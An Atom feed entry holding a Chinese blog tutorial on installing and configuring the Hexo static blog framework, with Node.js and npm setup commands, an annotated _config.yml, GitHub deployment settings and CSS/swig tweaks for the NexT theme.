    <content type="html"><![CDATA[<p><img src="/2018/07/24/hexo-config/hexo-config-1.png" alt=""></p><h2 id="Hexo简介"><a href="#Hexo简介" class="headerlink" title="Hexo简介"></a>Hexo简介</h2><a id="more"></a><ul><li>hexo 一个快速简洁高效的博客框架，其基于Node.js的静态blog程序</li><li>作者是台湾的<a href="https://github.com/tommy351" target="_blank" rel="noopener">tommy351</a></li><li>什么？你问我为什么不用Wordpress？你猜。</li><li>采用第一种的弊端就是”Github Pages”禁了百度爬虫</li><li>呵！才不存在呢。我等小萌新没有影响的。<br><img src="hexo-config-2.jpg" alt=""></li></ul><h2 id="必要前提"><a href="#必要前提" class="headerlink" title="必要前提"></a>必要前提</h2><p>安装hexo前必须的程序</p><ul><li>Node.js</li><li>Git</li></ul><p><a href="https://hexo.io/zh-cn/docs/" target="_blank" rel="noopener">Hexo官方文档</a><br><a href="https://www.runoob.com/nodejs/nodejs-install-setup.html" target="_blank" rel="noopener">Nodejs官方文档</a><br><a href="http://theme-next.iissnan.com/getting-started.html" target="_blank" rel="noopener">Next官方文档</a></p><h2 id="安装Nodejs"><a href="#安装Nodejs" class="headerlink" title="安装Nodejs"></a>安装Nodejs</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment">#安装nodejs</span></span><br><span class="line">$ sudo git <span class="built_in">clone</span> https://github.com/nodejs/node.git</span><br><span class="line">Cloning into <span class="string">'node'</span>...</span><br><span class="line"></span><br><span class="line"><span class="comment">#修改目录权限：</span></span><br><span class="line">$ sudo chmod -R 755 node</span><br><span class="line"></span><br><span class="line"><span class="comment">#使用 ./configure 创建编译文件，并按照：</span></span><br><span class="line">$ <span class="built_in">cd</span> node</span><br><span class="line">$ sudo ./configure</span><br><span class="line">$ sudo make</span><br><span class="line">$ sudo make install</span><br><span class="line"></span><br><span class="line"><span class="comment">#查看 node 版本：</span></span><br><span class="line">$ node --version</span><br><span class="line">v11.1.0</span><br></pre></td></tr></table></figure><h2 id="安装Git"><a href="#安装Git" class="headerlink" title="安装Git"></a>安装Git</h2><p><a href="/2018/07/24/git-config/">另一片文章</a></p><h2 id="安装hexo"><a href="#安装hexo" class="headerlink" title="安装hexo"></a>安装hexo</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ npm install hexo-cli -g</span><br></pre></td></tr></table></figure><h2 id="创建网站文件"><a href="#创建网站文件" class="headerlink" title="创建网站文件"></a>创建网站文件</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ mkdir blog</span><br><span class="line"><span class="comment"># 初始化</span></span><br><span class="line">$ hexo init blog &amp;&amp; <span class="built_in">cd</span> blog</span><br></pre></td></tr></table></figure><h2 id="安装hexo插件"><a href="#安装hexo插件" class="headerlink" title="安装hexo插件"></a>安装hexo插件</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ npm install hexo-deployer-git --save</span><br><span class="line">$ npm install hexo-asset-image --save</span><br><span class="line"><span class="comment"># Rss</span></span><br><span class="line">$ npm install hexo-generator-feed --save</span><br><span class="line"><span class="comment"># sitemap</span></span><br><span class="line">$ npm install hexo-generator-sitemap --save</span><br><span class="line">$ npm install hexo-generator-baidu-sitemap --save</span><br><span class="line"></span><br><span class="line">$ npm install hexo-renderer-pug --save</span><br><span class="line">$ npm install hexo-renderer-sass --save</span><br><span class="line"><span class="comment">#搜索插件</span></span><br><span class="line">npm install hexo-generator-searchdb --save</span><br><span class="line"><span class="comment"># 生成 SSH 公钥和密钥 默认生成在根目录的.ssh文件夹下 ~/.ssh</span></span><br><span class="line">$ ssh-keygen -t rsa </span><br><span class="line"><span class="comment"># 测试 (参数 -v 进入debug模式)</span></span><br><span class="line">$ ssh -t git@github.com </span><br><span class="line">$ hexo clean &amp;&amp; hexo g &amp;&amp; hexo s</span><br><span class="line">$ hexo d</span><br></pre></td></tr></table></figure><h2 id="网站配置文件"><a href="#网站配置文件" class="headerlink" title="网站配置文件"></a>网站配置文件</h2><ul><li>配置文件存储位置:blog/_config.yml<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># Hexo Configuration Hexo配置文件</span></span><br><span class="line"><span class="comment">## Docs: https://hexo.io/docs/configuration.html</span></span><br><span class="line"><span class="comment">## Source: https://github.com/hexojs/hexo/</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 网站信息</span></span><br><span class="line"><span class="comment"># 标题</span></span><br><span class="line">title: xx</span><br><span class="line"><span class="comment"># 副标题</span></span><br><span class="line">subtitle: xx</span><br><span class="line"><span class="comment"># 博客描述</span></span><br><span class="line">description: </span><br><span class="line"><span class="comment"># 作者昵称</span></span><br><span class="line">author: xx</span><br><span class="line"><span class="comment"># 网站语言，默认英语，设置简体汉语</span></span><br><span class="line">language: zh-CN</span><br><span class="line"></span><br><span class="line"><span class="comment"># 时区，默认电脑时区</span></span><br><span class="line">timezone: Asia/Shanghai</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 网址设置</span></span><br><span class="line"><span class="comment"># 如果网站是放在子目录中，将url设置成'http://yoursite.com/child'，将root设置成'/child/'</span></span><br><span class="line"><span class="comment"># 网址</span></span><br><span class="line">url: https://xx.github.io</span><br><span class="line"><span class="comment"># 网站根目录。如果网站是放在子目录中，将root设置成'子目录名'</span></span><br><span class="line">root: /</span><br><span class="line"><span class="comment"># 文章链接地址格式 。即文章存放的目录。</span></span><br><span class="line">permalink: :year/:month/:day/:title/</span><br><span class="line">permalink_defaults:</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 目录设置</span></span><br><span class="line"><span class="comment"># 资源文件夹，放在里面的文件会上传到github中</span></span><br><span class="line">source_dir: <span class="built_in">source</span></span><br><span class="line"><span class="comment"># 公共文件夹，存放生成的静态文件</span></span><br><span class="line">public_dir: public</span><br><span class="line"><span class="comment"># 标签文件夹，默认是tags。实际存放在source/tags中。</span></span><br><span class="line">tag_dir: tags</span><br><span class="line">rss_dir: rss</span><br><span class="line"><span class="comment"># 档案文件夹，默认是archives。</span></span><br><span class="line">archive_dir: archives</span><br><span class="line"><span class="comment"># 分类文件夹，默认是categories。实际存放在source/categories中。</span></span><br><span class="line">category_dir: categories</span><br><span class="line"><span class="comment"># 代码文件夹，默认是downloads/code</span></span><br><span class="line">code_dir: downloads/code</span><br><span class="line"><span class="comment"># 国际化文件夹，默认跟language相同</span></span><br><span class="line">i18n_dir: :lang</span><br><span class="line"><span class="comment"># 不需要渲染的文件夹或文件夹,放在[]中</span></span><br><span class="line"><span class="comment"># 这两个文件是百度和google的站长验证文件，不能渲染，否则会改变内容，不能验证过</span></span><br><span class="line">skip_render: [baidu_verify_R9MZjdMkXT.html, google0f8fac7da2b48ef8.html, README.md, 模板.md]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 写作选项</span></span><br><span class="line"><span class="comment"># 新建博文（帖子）的默认名称</span></span><br><span class="line"><span class="comment"># File name of new posts</span></span><br><span class="line">new_post_name: :title.md </span><br><span class="line"><span class="comment"># 默认布局模板是post，而不是draft和page</span></span><br><span class="line">default_layout: post</span><br><span class="line"><span class="comment"># 是否将标题转换成标题形式（首字母大写）</span></span><br><span class="line">titlecase: <span class="literal">false</span> <span class="comment"># Transform title into titlecase</span></span><br><span class="line"><span class="comment"># 在新标签页面中打开网页</span></span><br><span class="line">external_link: <span class="literal">true</span> <span class="comment"># Open external links in new tab</span></span><br><span class="line">filename_case: 0</span><br><span class="line"><span class="comment"># 是否渲染草稿</span></span><br><span class="line">render_drafts: <span class="literal">false</span></span><br><span class="line"><span class="comment"># 启动 Asset 文件夹</span></span><br><span class="line">post_asset_folder: <span class="literal">false</span></span><br><span class="line"><span class="comment"># 把链接改为与根目录的相对位址</span></span><br><span class="line">relative_link: <span class="literal">false</span></span><br><span class="line"><span class="comment"># 显示未来的文章</span></span><br><span class="line">future: <span class="literal">true</span></span><br><span class="line"><span class="comment"># 代码块的设置</span></span><br><span class="line">highlight:</span><br><span class="line">  <span class="built_in">enable</span>: <span class="literal">true</span>          <span class="comment">#  使用代码高亮</span></span><br><span class="line">  line_number: <span class="literal">true</span> <span class="comment"># 显示行号</span></span><br><span class="line">  auto_detect: <span class="literal">true</span>  <span class="comment"># 自动检测语言</span></span><br><span class="line">  tab_replace:</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 分类和标签</span></span><br><span class="line"><span class="comment"># 默认分类</span></span><br><span class="line">default_category: uncategorized</span><br><span class="line"><span class="comment"># 分类别名</span></span><br><span class="line">category_map:</span><br><span class="line"><span class="comment"># 标签别名</span></span><br><span class="line">tag_map:</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 日期和时间格式</span></span><br><span class="line"><span class="comment"># Hexo 使用 Moment.js 来解析和显示时间。</span></span><br><span class="line"><span class="comment">## You can customize the date format as defined in</span></span><br><span class="line"><span class="comment">## http://momentjs.com/docs/#/displaying/format/</span></span><br><span class="line">date_format: YYYY-MM-DD</span><br><span class="line">time_format: HH:mm:ss</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 分页配置</span></span><br><span class="line"><span class="comment"># ---------------下面选项需要对应插件的支持---------------</span></span><br><span class="line"><span class="comment"># npm install hexo-generator-index --save</span></span><br><span class="line"><span class="comment"># npm install hexo-generator-archive --save</span></span><br><span class="line"><span class="comment"># npm install hexo-generator-category --save</span></span><br><span class="line"><span class="comment"># npm install hexo-generator-tag --save</span></span><br><span class="line"><span class="comment">## Set per_page to 0 to disable pagination</span></span><br><span class="line"><span class="comment"># 每页显示的文章量 </span></span><br><span class="line"><span class="comment"># per_page: 20</span></span><br><span class="line"><span class="comment"># 首页的分页设置</span></span><br><span class="line">index_generator:</span><br><span class="line">  per_page: 5</span><br><span class="line"><span class="comment"># 归档页的分页设置</span></span><br><span class="line">archive_generator:</span><br><span class="line">  per_page: 30</span><br><span class="line">  yearly: <span class="literal">true</span></span><br><span class="line">  monthly: <span class="literal">true</span></span><br><span class="line"><span class="comment"># 标签页的分页设置</span></span><br><span class="line">tag_generator:</span><br><span class="line">  per_page: 20</span><br><span class="line"></span><br><span class="line"><span class="comment"># 分页路径，在public中可以看到</span></span><br><span class="line"><span class="comment"># pagination_dir: page</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># Extensions 拓展插件配置</span></span><br><span class="line"><span class="comment">## Plugins: https://hexo.io/plugins/</span></span><br><span class="line">plugins: </span><br><span class="line">baidusitemap: </span><br><span class="line">  path: baidusitemap.xml</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 配置RSS</span></span><br><span class="line">feed: </span><br><span class="line">  <span class="comment"># feed 类型 (atom/rss2)</span></span><br><span class="line">  <span class="built_in">type</span>: atom   </span><br><span class="line">  <span class="comment"># rss 路径</span></span><br><span class="line">  path: atom.xml  </span><br><span class="line">  <span class="comment"># 在 rss 中最多生成的文章数(0显示所有)</span></span><br><span class="line">  <span class="built_in">limit</span>: 0</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 自定义站点内容搜索</span></span><br><span class="line"><span class="comment"># 需要先安装插件：</span></span><br><span class="line"><span class="comment"># npm install hexo-generator-search --save</span></span><br><span class="line">search:</span><br><span class="line">  path: search.xml</span><br><span class="line">  <span class="comment"># 如只想索引文章，可设置为post</span></span><br><span class="line">  field: all </span><br><span class="line"></span><br><span class="line"><span class="comment"># 主题配置</span></span><br><span class="line"><span class="comment">## Themes: https://hexo.io/themes/</span></span><br><span class="line">theme: maupassant</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 部署配置</span></span><br><span class="line"><span class="comment">## Docs: https://hexo.io/docs/deployment.html</span></span><br><span class="line">deploy:</span><br><span class="line">  <span class="built_in">type</span>: git</span><br><span class="line">  <span class="comment"># 部署到github</span></span><br><span class="line">  repository: git@github.com:xxx/xxx.github.io.git</span><br><span class="line">  <span class="comment"># 分支默认master</span></span><br><span class="line">  branch: maste</span><br></pre></td></tr></table></figure></li></ul><h2 id="主题美化"><a href="#主题美化" class="headerlink" title="主题美化"></a>主题美化</h2><h3 id="修改文章底部的那个带-号的标签"><a href="#修改文章底部的那个带-号的标签" class="headerlink" title="修改文章底部的那个带#号的标签"></a>修改文章底部的那个带#号的标签</h3><p>修改模板/themes/next/layout/_macro/post.swig<br>搜索 rel=”tag”&gt;#，将 # 换成 <code>&lt;i class=&quot;fa fa-tag&quot;&gt;&lt;/i&gt;</code></p><h3 id="在每篇文章末尾统一添加“本文结束”标记"><a href="#在每篇文章末尾统一添加“本文结束”标记" class="headerlink" title="在每篇文章末尾统一添加“本文结束”标记"></a>在每篇文章末尾统一添加“本文结束”标记</h3><p>在路径 \themes\next\layout_macro 中新建 passage-end-tag.swig 文件,并添加以下内容：<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">&lt;div&gt;</span><br><span class="line">    &#123;% <span class="keyword">if</span> not is_index %&#125;</span><br><span class="line">        &lt;div style=<span class="string">"text-align:center;color: #ccc;font-size:14px;"</span>&gt;-------------本文结束,感谢您的阅读-------------&lt;/div&gt;</span><br><span class="line">    &#123;% endif %&#125;</span><br><span class="line">&lt;/div&gt;</span><br></pre></td></tr></table></figure></p><p>接着打开\themes\next\layout_macro\post.swig文件<br>在post-body 之后， post-footer之前添加<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">&lt;div&gt;</span><br><span class="line">  &#123;% <span class="keyword">if</span> not is_index %&#125;</span><br><span class="line">    &#123;% include <span class="string">'passage-end-tag.swig'</span> %&#125;</span><br><span class="line">  &#123;% endif %&#125;</span><br><span class="line">&lt;/div&gt;</span><br></pre></td></tr></table></figure></p><p>然后在主题配置文件中最后加入<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 文章末尾添加“本文结束”标记</span></span><br><span class="line">passage_end_tag:</span><br><span class="line">  enabled: <span class="literal">true</span></span><br></pre></td></tr></table></figure></p><h3 id="修改作者头像并旋转"><a href="#修改作者头像并旋转" class="headerlink" title="修改作者头像并旋转"></a>修改作者头像并旋转</h3><p>打开\themes\next\source\css_common\components\sidebar\sidebar-author.styl<br>在里面添加如下代码：<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">.site-author-image &#123;</span><br><span class="line">  display: block;</span><br><span class="line">  margin: 0 auto;</span><br><span class="line">  padding: <span class="variable">$site</span>-author-image-padding;</span><br><span class="line">  max-width: <span class="variable">$site</span>-author-image-width;</span><br><span class="line">  height: <span class="variable">$site</span>-author-image-height;</span><br><span class="line">  border: <span class="variable">$site</span>-author-image-border-width solid <span class="variable">$site</span>-author-image-border-color;</span><br><span class="line"></span><br><span class="line">  /* 头像圆形 */</span><br><span class="line">  border-radius: 80px;</span><br><span class="line">  -webkit-border-radius: 80px;</span><br><span class="line">  -moz-border-radius: 80px;</span><br><span class="line">  box-shadow: inset 0 -1px 0 <span class="comment">#333sf;</span></span><br><span class="line"></span><br><span class="line">  /* 设置循环动画 [animation: (play)动画名称 (2s)动画播放时长单位秒或微秒 (ase-out)动画播放的速度曲线为以低速结束 </span><br><span class="line">    (1s)等待1秒然后开始动画 (1)动画播放次数(infinite为循环播放) ]*/</span><br><span class="line"> </span><br><span class="line"></span><br><span class="line">  /* 鼠标经过头像旋转360度 */</span><br><span class="line">  -webkit-transition: -webkit-transform 1.0s ease-out;</span><br><span class="line">  -moz-transition: -moz-transform 1.0s ease-out;</span><br><span class="line">  transition: transform 1.0s ease-out;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">img:hover &#123;</span><br><span class="line">  /* 鼠标经过停止头像旋转 </span><br><span class="line">  -webkit-animation-play-state:paused;</span><br><span class="line">  animation-play-state:paused;*/</span><br><span class="line"></span><br><span class="line">  /* 鼠标经过头像旋转360度 */</span><br><span class="line">  -webkit-transform: rotateZ(360deg);</span><br><span class="line">  -moz-transform: rotateZ(360deg);</span><br><span class="line">  transform: rotateZ(360deg);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">/* Z 轴旋转动画 */</span><br><span class="line">@-webkit-keyframes play &#123;</span><br><span class="line">  0% &#123;</span><br><span class="line">    -webkit-transform: rotateZ(0deg);</span><br><span class="line">  &#125;</span><br><span class="line">  100% &#123;</span><br><span class="line">    -webkit-transform: rotateZ(-360deg);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line">@-moz-keyframes play &#123;</span><br><span class="line">  0% &#123;</span><br><span class="line">    -moz-transform: rotateZ(0deg);</span><br><span class="line">  &#125;</span><br><span class="line">  100% &#123;</span><br><span class="line">    -moz-transform: rotateZ(-360deg);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line">@keyframes play &#123;</span><br><span class="line">  0% &#123;</span><br><span class="line">    transform: rotateZ(0deg);</span><br><span class="line">  &#125;</span><br><span class="line">  100% &#123;</span><br><span class="line">    transform: rotateZ(-360deg);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><h3 id="主页文章添加阴影效果"><a href="#主页文章添加阴影效果" class="headerlink" title="主页文章添加阴影效果"></a>主页文章添加阴影效果</h3><p>打开\themes\next\source\css_custom\custom.styl,向里面加入：</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">// 主页文章添加阴影效果</span><br><span class="line"> .post &#123;</span><br><span class="line">   margin-top: 60px;</span><br><span class="line">   margin-bottom: 60px;</span><br><span class="line">   padding: 25px;</span><br><span class="line">   -webkit-box-shadow: 0 0 5px rgba(202, 203, 203, .5);</span><br><span class="line">   -moz-box-shadow: 0 0 5px rgba(202, 203, 204, .5);</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure><ul><li><a href="https://segmentfault.com/a/1190000009544924" target="_blank" rel="noopener">美化参考文章</a></li></ul>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;&lt;img src=&quot;/2018/07/24/hexo-config/hexo-config-1.png&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
&lt;h2 id=&quot;Hexo简介&quot;&gt;&lt;a href=&quot;#Hexo简介&quot; class=&quot;headerlink&quot; title=&quot;Hexo简介&quot;&gt;&lt;/a&gt;Hexo简介&lt;/h2&gt;
    
    </summary>
    
      <category term="杂七杂八" scheme="https://t43wiu6.github.io/categories/%E6%9D%82%E4%B8%83%E6%9D%82%E5%85%AB/"/>
    
    
      <category term="hexo" scheme="https://t43wiu6.github.io/tags/hexo/"/>
    
  </entry>
  
</feed>
